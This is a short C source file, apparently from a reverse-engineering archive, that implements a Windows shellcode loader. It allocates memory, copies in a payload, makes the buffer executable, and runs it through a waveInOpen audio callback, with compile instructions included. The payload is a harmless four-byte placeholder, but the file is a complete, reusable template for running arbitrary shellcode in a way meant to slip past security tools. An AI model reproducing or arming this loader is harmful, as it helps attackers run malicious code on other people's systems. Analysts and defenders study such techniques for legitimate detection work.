/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  waveInOpen
*/

#include <windows.h>
#include <stdint.h>
#include <mmeapi.h>

#pragma comment(lib,"winmm")


int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    HWAVEIN handle;
    WAVEFORMATEX wfx;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        ZeroMemory(&wfx, sizeof(WAVEFORMATEX));
        wfx.wFormatTag  = WAVE_FORMAT_PCM;
        wfx.nChannels   = 1;
        wfx.nSamplesPerSec  = 44100;
        wfx.nAvgBytesPerSec = 44100 * 2;
        wfx.nBlockAlign = 2;
        wfx.wBitsPerSample  = 16;
        wfx.cbSize = 0;

        // execute function as callback
        waveInOpen(&handle, WAVE_MAPPER, &wfx, runtime, NULL, CALLBACK_FUNCTION);
        
        waveInClose(handle);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}